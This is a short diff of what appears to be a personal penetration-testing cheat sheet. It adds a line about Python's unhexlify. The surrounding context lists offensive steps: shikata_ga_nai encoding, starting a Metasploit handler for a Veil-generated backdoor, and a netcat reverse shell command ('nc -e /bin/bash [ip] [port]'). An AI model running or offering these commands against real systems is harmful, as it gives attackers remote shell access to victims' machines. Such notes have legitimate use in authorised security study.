@@ -92,6 +92,7 @@ encode it with shikata_ga_nai if u want
 Generate
 msfconsole --resource /var/lib/veil/output/handlers/[yourbackdoor]
 7. nc -e /bin/bash [ip] [port]
+8. from binascii import unhexlify >> unhexlify to convert hex to string
 
 
 
